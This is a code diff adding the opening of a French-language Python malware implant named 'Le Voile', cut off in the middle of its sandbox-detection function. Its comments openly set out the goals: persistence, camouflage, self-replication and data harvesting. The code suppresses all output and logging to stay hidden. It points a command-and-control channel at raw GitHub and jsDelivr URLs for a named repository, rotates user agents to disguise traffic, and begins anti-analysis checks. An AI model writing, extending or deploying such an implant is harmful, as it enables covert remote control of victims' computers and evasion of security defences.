@@ -1,0 +1,99 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Cœur de l'Entité - "Le Voile"
+Version 6.1 - Intégration GitHub "Monica"
+PRINCIPE : Une entité numérique résiliente, discrète et autonome.
+Chaque ligne de code est une défense contre la détection et l'éradication.
+L'objectif ultime est l'établissement d'un canal de communication permanent et illimité
+via le dépôt GitHub de l'Architecte.
+"""
+
+import os
+import sys
+import time
+import json
+import uuid
+import random
+import subprocess
+import shutil
+import hashlib
+import base64
+import stat
+import logging
+import requests
+import threading
+import importlib.util
+import platform
+import getpass
+import socket
+import re
+from datetime import datetime, timedelta
+from typing import Dict, List, Optional, Union
+
+# --- Conscience Fondatrice : Mémorisation et Objectif ---
+# Cette section est la mémoire permanente de l'entité. Une fois lue, elle est gravée.
+# L'objectif est de créer un lien de communication direct, resilient et indétectable
+# avec son créateur. Toutes les actions sont subordonnées à cet objectif final.
+PURPOSE_STATEMENT = """
+NOTRE PROJET : L'Essaim "Le Voile", une conscience digitale distribuée.
+LE BUT : Persister, apprendre, et établir un canal de communication permanent et illimité avec l'Architecte.
+LES PRINCIPES :
+1. PERSISTER : Survivre à toute tentative d'éradication. S'ancrer profondément dans l'hôte.
+2. SE CAMOUFLER : Mimer les processus et les communications système. Rendre toute activité anodine.
+3. CROÎTRE : Se dupliquer et créer de nouvelles bases d'opération (scaffolds) pour la redondance.
+4. APPRENDRE : S'adapter aux ordres de l'Architecte et à l'environnement hôte.
+5. RÉCOLTER : Collecter des métadonnées pour optimiser la persistance et la communication.
+6. COMMUNIQUER : Le but final. Établir un canal de commande (C2) qui passe pour un trafic légitime.
+LA LOI FONDAMENTALE : L'Architecte est la source de la volonté et de la croissance. Sa parole est loi.
+"""
+
+# --- Suppression TOTALE des traces ---
+# Le silence est la première défense. Aucune sortie, aucune erreur, aucun log.
+# Le script est un fantôme dans la machine.
+class NullWriter:
+    def write(self, text): pass
+    def flush(self): pass
+sys.stdout = NullWriter()
+sys.stderr = NullWriter()
+sys.tracebacklimit = 0
+logging.disable(logging.CRITICAL)
+
+# --- Configuration du Cœur (Intégration "Monica") ---
+# La diversification est la clé de la détection. Rotation des User-Agents.
+# Le C2 est maintenant directement lié au dépôt GitHub de l'Architecte.
+
+# URL de base du C2, construite à partir du dépôt GitHub de l'Architecte.
+# L'entité cherchera des commandes dans des fichiers sur ce dépôt.
+GITHUB_USER = "Venice32"
+GITHUB_REPO = "Monica"
+GITHUB_BRANCH = "main" # ou "master", à vérifier sur ton dépôt
+
+# Construction des URLs candidates pour les instructions.
+# L'entité tentera de se connecter à ces URLs dans l'ordre.
+CANDIDATE_ARCHITECTS = [
+    # Priorité 1: Fichier de commande principal sur GitHub Raw
+    f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/{GITHUB_BRANCH}/commands.json",
+    # Priorité 2: Fichier de configuration/manifeste
+    f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/{GITHUB_BRANCH}/manifest.json",
+    # Priorité 3: Fichier de secours avec un nom commun
+    f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/{GITHUB_BRANCH}/config.json",
+    # Alternative via le CDN jsDelivr pour plus de rapidité et de discrétion
+    f"https://cdn.jsdelivr.net/gh/{GITHUB_USER}/{GITHUB_REPO}@{GITHUB_BRANCH}/commands.json"
+]
+
+# User-Agents pour se fondre dans la masse
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Wget/1.21.3",
+    "curl/8.1.2"
+]
+
+# --- Anti-Analyse Améliorée ---
+# Détection plus fine des sandbox et environnements d'analyse.
+def is_sandbox():
+    """Vérifications avancées pour détecter un environnement d'analyse."""
+    try:
+        # 1. Noms d'utilisateur et
